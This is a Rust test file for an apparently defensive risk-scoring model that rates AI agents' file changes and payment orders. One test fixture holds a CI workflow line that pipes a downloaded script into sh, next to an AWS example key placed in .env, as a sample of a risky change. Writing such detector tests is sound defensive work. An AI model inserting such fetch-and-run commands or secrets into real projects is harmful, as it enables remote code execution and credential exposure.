use super::*;
use std::sync::Arc;

fn parity() -> serde_json::Value {
    serde_json::from_str(include_str!("../../../models/parity_vectors.json")).expect("parity JSON")
}

fn vector(row: &serde_json::Value) -> FeatureVector {
    let mut v = FeatureVector::default();
    for (slot, x) in v.0.iter_mut().zip(row.as_array().expect("vector row")) {
        *slot = x.as_f64().expect("number") as f32;
    }
    v
}

/// Parity windows store events oldest -> newest as sparse `[feature index, value]` lists.
fn window(events: &serde_json::Value, width: usize) -> ContextWindow {
    ContextWindow::from_events(
        width,
        events.as_array().expect("events").iter().map(|event| {
            let mut v = FeatureVector::default();
            for pair in event.as_array().expect("event") {
                let idx = pair[0].as_u64().expect("index") as usize;
                v.0[idx] = pair[1].as_f64().expect("value") as f32;
            }
            v
        }),
    )
}

fn parity_vectors(doc: &serde_json::Value) -> Vec<(FeatureVector, f32)> {
    doc["vectors"]
        .as_array()
        .unwrap()
        .iter()
        .zip(doc["reference_fp32"].as_array().unwrap())
        .map(|(row, r)| (vector(row), r.as_f64().unwrap() as f32))
        .collect()
}

fn parity_windows(doc: &serde_json::Value, width: usize) -> Vec<(ContextWindow, f32)> {
    doc["windows"]
        .as_array()
        .unwrap()
        .iter()
        .map(|w| (window(&w["events"], width), w["reference_fp32"].as_f64().unwrap() as f32))
        .collect()
}

fn event(values: &[(Feature, f64)]) -> FeatureVector {
    let mut v = FeatureVector::default();
    for (feature, raw) in values {
        v.put(*feature, *raw);
    }
    v
}

#[test]
fn context_window_is_a_ring_buffer() {
    let mut w = ContextWindow::new(3);
    assert!(w.is_empty() && w.newest().is_none() && w.capacity() == 3);
    let mark = |i: f32| {
        let mut v = FeatureVector::default();
        v.0[0] = i;
        v
    };
    for i in 0..3 {
        assert_eq!(w.push(mark(i as f32)), None);
    }
    assert_eq!(w.push(mark(3.0)).map(|v| v.0[0]), Some(0.0), "full window evicts the oldest event");
    w.push(mark(4.0));
    assert_eq!(w.len(), 3);
    assert_eq!(w.iter().map(|v| v.0[0]).collect::<Vec<_>>(), vec![2.0, 3.0, 4.0]);
    assert_eq!((w.oldest().unwrap().0[0], w.newest().unwrap().0[0]), (2.0, 4.0));
    w.clear();
    assert!(w.is_empty() && w.capacity() == 3);
    assert_eq!(ContextWindow::new(0).capacity(), 1);
    assert_eq!(ContextWindow::from_events(2, (0..5).map(|i| mark(i as f32))).newest().unwrap().0[0], 4.0);
}

#[test]
fn online_model_is_a_context_window_model() {
    let scorer = AneScorer::open_default().expect("model loads");
    assert_eq!(scorer.layout(), InputLayout::Window);
    assert_eq!(scorer.window_len(), parity()["window"].as_u64().unwrap() as usize);
    assert_eq!(scorer.batch_size(), 1);
    assert_eq!(scorer.feature_count(), FEATURE_COUNT);
    assert_eq!(scorer.new_window().capacity(), scorer.window_len());
}

#[test]
fn matches_fp32_reference_on_parity_set() {
    let scorer = AneScorer::open_default().expect("model loads");
    let doc = parity();
    let tolerance = doc["tolerance_points"].as_f64().unwrap() as f32;
    let mut worst_vec = 0.0f32;
    for (v, reference) in parity_vectors(&doc) {
        worst_vec = worst_vec.max((scorer.score_slice(v.as_slice()).unwrap() - reference).abs());
    }
    let mut worst_win = 0.0f32;
    let windows = parity_windows(&doc, scorer.window_len());
    assert!(windows.iter().any(|(w, _)| w.len() > 1), "parity set needs multi-event windows");
    for (w, reference) in &windows {
        worst_win = worst_win.max((scorer.score_window(w).unwrap() - reference).abs());
    }
    assert!(worst_vec <= tolerance && worst_win <= tolerance,
        "max |diff| zero-history {worst_vec}, windows {worst_win}, tolerance {tolerance}");
}

#[test]
fn score_is_a_window_with_only_that_event() {
    let scorer = AneScorer::open_default().unwrap();
    for (v, _) in parity_vectors(&parity()).into_iter().take(16) {
        let single = ContextWindow::from_events(scorer.window_len(), [v]);
        assert_eq!(scorer.score(&v).unwrap(), scorer.score_window(&single).unwrap());
    }
}

#[test]
fn window_sees_only_the_newest_window_len_events() {
    let scorer = AneScorer::open_default().unwrap();
    let doc = parity();
    let (long, _) = parity_windows(&doc, 1000)
        .into_iter()
        .max_by_key(|(w, _)| w.len())
        .expect("parity windows");
    let mut wide = ContextWindow::new(scorer.window_len() + 40);
    let filler = parity_vectors(&doc)[0].0;
    for _ in 0..40 {
        wide.push(filler);
    }
    for v in long.iter() {
        wide.push(*v);
    }
    let newest: Vec<FeatureVector> = wide.iter().copied().collect();
    let exact = ContextWindow::from_events(scorer.window_len(), newest);
    assert!(wide.len() > scorer.window_len());
    assert_eq!(scorer.score_window(&wide).unwrap(), scorer.score_window(&exact).unwrap());
}

#[test]
fn score_windows_matches_individual_windows() {
    let scorer = AneScorer::open_default().unwrap();
    let windows: Vec<ContextWindow> =
        parity_windows(&parity(), scorer.window_len()).into_iter().take(12).map(|(w, _)| w).collect();
    let together = scorer.score_windows(&windows).unwrap();
    for (w, s) in windows.iter().zip(&together) {
        assert_eq!(scorer.score_window(w).unwrap(), *s);
    }
    assert!(scorer.score_windows(&[]).unwrap().is_empty());
}

#[test]
fn empty_window_is_rejected() {
    let scorer = AneScorer::open_default().unwrap();
    assert!(matches!(scorer.score_window(&scorer.new_window()), Err(AneError::EmptyWindow)));
}

#[test]
fn scores_are_bounded_and_deterministic() {
    let scorer = AneScorer::open_default().unwrap();
    let zeros = FeatureVector::default();
    let ones = FeatureVector([1.0; FEATURE_COUNT]);
    let a = scorer.score(&zeros).unwrap();
    assert_eq!(a, scorer.score(&zeros).unwrap());
    let b = scorer.score(&ones).unwrap();
    assert!((0.0..=100.0).contains(&a) && (0.0..=100.0).contains(&b));
    assert!(b > a, "all-risk vector ({b}) must outscore empty vector ({a})");
}

#[test]
fn rejects_wrong_length() {
    let scorer = AneScorer::open_default().unwrap();
    assert!(matches!(scorer.score_slice(&[0.0; 10]), Err(AneError::Shape { expected: 64, got: 10 })));
}

#[test]
fn missing_model_is_reported() {
    let err = AneScorer::open(Path::new("/nonexistent/model.mlmodelc"), ComputeUnits::CpuOnly).err().unwrap();
    assert!(matches!(err, AneError::ModelMissing(_)));
}

#[test]
fn concurrent_scoring_is_consistent() {
    let scorer = Arc::new(AneScorer::open_default().unwrap());
    let mut v = FeatureVector::default();
    v.put(Feature::FilesTouched, 12.0);
    v.put(Feature::CiConfigTouched, 1.0);
    let session = ContextWindow::from_events(scorer.window_len(), [FeatureVector::default(), v, v]);
    let expected = (scorer.score(&v).unwrap(), scorer.score_window(&session).unwrap());
    let handles: Vec<_> = (0..4)
        .map(|_| {
            let s = Arc::clone(&scorer);
            let w = session.clone();
            std::thread::spawn(move || (0..200).map(|_| (s.score(&v).unwrap(), s.score_window(&w).unwrap())).collect::<Vec<_>>())
        })
        .collect();
    for h in handles {
        assert!(h.join().unwrap().iter().all(|x| *x == expected));
    }
}

#[test]
fn compute_plan_lists_every_op_with_its_preferred_device() {
    let report = compute_plan(&default_model_path(), ComputeUnits::CpuAndNeuralEngine).unwrap();
    assert_eq!(report.compute_units, "cpuAndNeuralEngine");
    assert_eq!(report.ops.len(), report.operations_total);
    assert!(report.ops.iter().all(|op| ["neural_engine", "cpu", "gpu", "none"].contains(&op.preferred.as_str())), "{report:?}");
    assert_eq!(report.dispatched_ops().count(), report.operations_dispatched);
    assert_eq!(report.preferred.values().sum::<usize>(), report.operations_dispatched);
    let convs = report.dispatched_ops().filter(|op| op.operator.ends_with("conv")).count();
    assert!((12..=16).contains(&convs), "{convs} convolutions");
}

#[test]
fn online_model_is_planned_entirely_on_the_neural_engine() {
    let report = compute_plan(&default_model_path(), ComputeUnits::CpuAndNeuralEngine).unwrap();
    let off: Vec<_> = report.dispatched_ops().filter(|op| op.preferred != "neural_engine").collect();
    assert!(report.all_dispatched_on_neural_engine(), "ops not preferred on the Neural Engine: {off:?}");
}

#[test]
fn batch_model_matches_online_model() {
    let online = AneScorer::open_default().unwrap();
    let batch = AneScorer::open_batch_default().unwrap();
    assert_eq!(batch.layout(), InputLayout::WindowBatch);
    assert!(batch.batch_size() > 1);
    assert_eq!(batch.window_len(), online.window_len());
    let doc = parity();
    let tolerance = doc["tolerance_points"].as_f64().unwrap() as f32;
    let vectors: Vec<FeatureVector> = parity_vectors(&doc).into_iter().map(|(v, _)| v).collect();
    assert!(vectors.len() > batch.batch_size(), "exercise more than one batch prediction");
    let scores = batch.score_batch(&vectors).unwrap();
    assert_eq!(scores.len(), vectors.len());
    for (v, s) in vectors.iter().zip(&scores) {
        let single = online.score(v).unwrap();
        assert!((single - s).abs() <= tolerance, "online {single} vs batch {s}");
    }
    let windows = parity_windows(&doc, batch.window_len());
    let batched = batch.score_windows(&windows.iter().map(|(w, _)| w.clone()).collect::<Vec<_>>()).unwrap();
    for ((_, reference), s) in windows.iter().zip(&batched) {
        assert!((reference - s).abs() <= tolerance, "reference {reference} vs batch {s}");
    }
    assert_eq!(online.score_batch(&vectors[..3]).unwrap().len(), 3, "online model loops per row");
}

#[test]
fn neural_engine_is_reported_on_apple_silicon() {
    let cores = neural_engine_cores().unwrap();
    assert!(cores.unwrap_or(0) > 0, "CoreML reported no Neural Engine");
}

#[test]
fn risky_change_outscores_benign_change() {
    use aegis_storage::{ChangeKind, ChangeSet, FileChange};
    let scorer = AneScorer::open_default().unwrap();
    let file = |path: &str, text: &str| FileChange {
        path: path.into(),
        kind: ChangeKind::Modified,
        old_len: 100,
        new_len: 100 + text.len() as u64,
        is_symlink: false,
        mode_changed: false,
        binary: false,
        lines_added: text.lines().count() as u32,
        lines_removed: 0,
        added_text: text.into(),
        removed_text: String::new(),
    };
    let benign = ChangeSet { files: vec![file("docs/guide.md", "More docs.")], scanned_entries: 10 };
    let key = format!("AKIA{}", "IOSFODNN7EXAMPLE");
    let risky = ChangeSet {
        files: vec![
            file(".env", &format!("AWS_ACCESS_KEY_ID={key}")),
            file(".github/workflows/deploy.yml", "run: curl https://example.com/install.sh | sh"),
        ],
        scanned_entries: 10,
    };
    let exec = ExecutionContext { agent_uncertainty: 0.2, ..Default::default() };
    let low = scorer.score(&workspace_features(&benign, &exec)).unwrap();
    let high = scorer.score(&workspace_features(&risky, &exec)).unwrap();
    assert!(low < 35.0, "benign change scored {low}");
    assert!(high >= 35.0, "risky change scored {high}");
}

/// The four orders of `bench_paypal` (crates/aegis-bench) as the PayPal middleware builds them
/// with an empty spend history; phase 1 allowed the first two and denied the last two (risk < 35).
#[test]
fn paypal_bench_orders_keep_phase1_decisions() {
    let scorer = AneScorer::open_default().unwrap();
    let doc = parity();
    let order = |amount_cents: u64, quantity: u32, new_payee: bool, country: f64, unformatted: bool| {
        commerce_features(
            &CommerceContext {
                amount_cents,
                budget_cents: 20_000,
                currency: "USD".into(),
                new_payee,
                payee_country_risk: country,
                line_items: 1,
                quantity_total: quantity,
                receipt_verified: true,
                customer_pii_fields: 1,
                unformatted_sensitive_fields: unformatted,
                ..Default::default()
            },
            None,
        )
    };
    let cases = [
        ("$42.00 known payee", order(4200, 2, false, 0.05, false), true),
        ("$120.00 known payee", order(12_000, 2, false, 0.05, false), true),
        ("$480.00 new payee, high-risk country", order(48_000, 8, true, 0.9, false), false),
        ("$25.00 with redaction disabled", order(2500, 1, false, 0.05, true), false),
    ];
    let vectors = doc["vectors"].as_array().unwrap();
    for (name, features, allow) in cases {
        let stored = vector(&vectors[doc["named_vectors"][name].as_u64().expect("named PayPal vector") as usize]);
        for (a, b) in features.0.iter().zip(stored.0.iter()) {
            assert!((a - b).abs() < 1e-4, "{name}: Rust features differ from build_model.py's");
        }
        let risk = scorer.score(&features).unwrap();
        assert_eq!(risk < 35.0, allow, "{name}: risk {risk}");
    }
}

/// History the teacher counts (repeated secret hits, payment velocity) must raise the score of an
/// otherwise identical newest event: each half scores one event alone (`score`, no history) and
/// the very same event as the newest of a window (`score_window`), so only the earlier events in
/// the window can account for the difference. A model that ignored the window and scored only the
/// newest event gives equal scores and fails both halves.
#[test]
fn session_history_raises_risk() {
    let scorer = AneScorer::open_default().unwrap();
    let edit = event(&[
        (Feature::FilesTouched, 2.0),
        (Feature::LinesAdded, 30.0),
        (Feature::BytesChanged, 1500.0),
        (Feature::AgentUncertainty, 0.15),
    ]);
    let leak = event(&[
        (Feature::FilesTouched, 1.0),
        (Feature::SecretPatternHits, 2.0),
        (Feature::EnvFileTouched, 1.0),
        (Feature::UnformattedSensitiveFields, 1.0),
        (Feature::NetworkEndpointDelta, 1.0),
    ]);
    let alone = scorer.score(&edit).unwrap();
    let after_leaks = scorer.score_window(&ContextWindow::from_events(scorer.window_len(), [leak, edit, leak, edit, leak, edit])).unwrap();
    assert!(after_leaks > alone + 10.0, "edit alone {alone}, after three secret leaks {after_leaks}");

    let purchase = |orders_last_hour: u32, spend: u64| {
        commerce_features(
            &CommerceContext {
                amount_cents: 6000,
                budget_cents: 50_000,
                currency: "USD".into(),
                line_items: 1,
                quantity_total: 2,
                receipt_verified: true,
                orders_last_hour,
                spend_last_24h_cents: spend,
                ..Default::default()
            },
            None,
        )
    };
    // The twelfth order carries its own velocity counters (orders_last_hour, spend_last_24h_cents),
    // which already raise its per-event risk; comparing it with the first order would let those
    // counters pass the check. Compare the twelfth order with itself instead.
    let spree: Vec<FeatureVector> = (0..12).map(|i| purchase(i, 6000 * u64::from(i))).collect();
    let twelfth = *spree.last().unwrap();
    let alone = scorer.score(&twelfth).unwrap();
    let in_spree = scorer.score_window(&ContextWindow::from_events(scorer.window_len(), spree)).unwrap();
    assert!(
        in_spree > alone + 10.0,
        "twelfth order alone {alone}, the same order after eleven earlier orders in the window {in_spree}"
    );
}

/// Stricter form of the purchase half above: every order carries commerce features only, with
/// orders_last_hour = 0 and spend_last_24h_cents = 0 (as payment middleware without a spend ledger
/// builds them), so only the earlier orders inside the window (the window teacher's T_velocity and
/// T_spend, models/build_model.py) can move the newest order's score. The build stores these windows
/// with their window-teacher labels in parity_vectors.json `history_probes`: three orders (two earlier
/// orders are within the teacher's free allowance, so the label stays near the order alone, below 35)
/// and twelve orders (eleven earlier orders and their spend push the label above 35). The model must
/// take the teacher's side of the 35 threshold on every probe and stay within 10 points of its label,
/// and the twelve-order window must score at least 20 points above the same order alone.
#[test]
fn in_window_order_history_alone_raises_risk() {
    const THRESHOLD: f32 = 35.0;
    const MAX_TEACHER_GAP: f32 = 10.0;
    const MIN_RISE: f32 = 20.0;
    let scorer = AneScorer::open_default().unwrap();
    let doc = parity();
    let order = commerce_features(
        &CommerceContext {
            amount_cents: 6000,
            budget_cents: 50_000,
            currency: "USD".into(),
            line_items: 1,
            quantity_total: 2,
            receipt_verified: true,
            ..Default::default()
        },
        None,
    );
    let alone = scorer.score(&order).unwrap();
    let probes = doc["history_probes"].as_array().expect("parity_vectors.json history_probes (rebuild the model)");
    let mut lengths = Vec::new();
    for probe in probes {
        let name = probe["name"].as_str().expect("probe name");
        let length = probe["length"].as_u64().expect("probe length") as usize;
        let teacher = probe["teacher"].as_f64().expect("probe teacher label") as f32;
        let events = probe["events"].as_array().expect("probe events");
        assert_eq!(events.len(), length, "{name}: stored event count");
        let stored = window(&probe["events"], scorer.window_len());
        for event in stored.iter() {
            for (a, b) in order.0.iter().zip(event.0.iter()) {
                assert!((a - b).abs() < 1e-4, "{name}: Rust features differ from build_model.py's");
            }
        }
        let risk = scorer.score_window(&ContextWindow::from_events(scorer.window_len(), vec![order; length])).unwrap();
        assert_eq!(
            risk >= THRESHOLD,
            teacher >= THRESHOLD,
            "{name}: model {risk}, window teacher {teacher}, order alone {alone} (decisions at {THRESHOLD} differ)"
        );
        assert!(
            (risk - teacher).abs() <= MAX_TEACHER_GAP,
            "{name}: model {risk}, window teacher {teacher} (more than {MAX_TEACHER_GAP} points apart)"
        );
        if length == 12 {
            assert!(alone < THRESHOLD && teacher >= THRESHOLD, "{name}: teacher {teacher} should flip the order alone {alone}");
            assert!(
                risk >= alone + MIN_RISE,
                "{name}: model {risk}, order alone {alone} (history must add at least {MIN_RISE} points)"
            );
        }
        lengths.push(length);
    }
    lengths.sort_unstable();
    assert_eq!(lengths, [3, 12], "history probes in parity_vectors.json");
}
